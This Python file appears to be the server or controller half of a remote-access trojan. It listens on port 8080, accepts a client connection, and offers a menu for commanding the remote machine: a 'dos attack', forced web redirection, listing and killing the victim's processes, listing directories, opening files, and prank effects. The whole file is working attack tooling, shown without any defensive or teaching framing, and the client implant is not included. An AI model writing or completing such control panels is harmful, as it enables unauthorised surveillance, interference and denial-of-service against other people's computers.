import math
import socket
import sys
import time

def server_side():
    new_socket_conn = socket.socket()
    host_name = socket.gethostname()
    socket_ip = socket.gethostbyname(host_name)
    port_num = 8080

    new_socket_conn.bind((host_name, port_num))
    print("Binding successful!")
    print("This is your IP: ", socket_ip)

    name = "Dhesi"
    new_socket_conn.listen(1)

    conn, add = new_socket_conn.accept()
    print("Received connection from ", add[0])
    print('Connection Established. Connected From: ', add[0])

    client_name = (conn.recv(1024)).decode()
    print(client_name + ' has connected.')
    conn.send(name.encode())

    while True:

        print(
            """
        1.dos attack
        2.web redirecting
        3.shock light
        4.list the running apps of client
        5.kill the process
        6.matrix 
        7.listfiles
        8.open files
            """
        )
        option = int(input("Enter you option :"))

        if option == 1: msg = "DDOS"
        if option == 2:
            url = input("Enter the website :")
            msg = "web`" + url
        if option == 3: msg = "shock"
        if option == 4: msg = "listapps"
        if option == 5:
            appName = input("Enter the process name want to be killed :")
            msg = "closeapp`"+appName
        if option == 6: msg = "matrix"
        if option == 7:
            path=input("enter path:")
            msg ="listfiles`"+path
        if option == 8:
            filePath = input("Enter the file path for file open. EX:C:\\image.jpg :")
            msg = "openfile`"+filePath

        conn.send(msg.encode())

        msg = conn.recv(2147483648)
        msg = msg.decode()
        print(client_name, ':', msg)







server_side()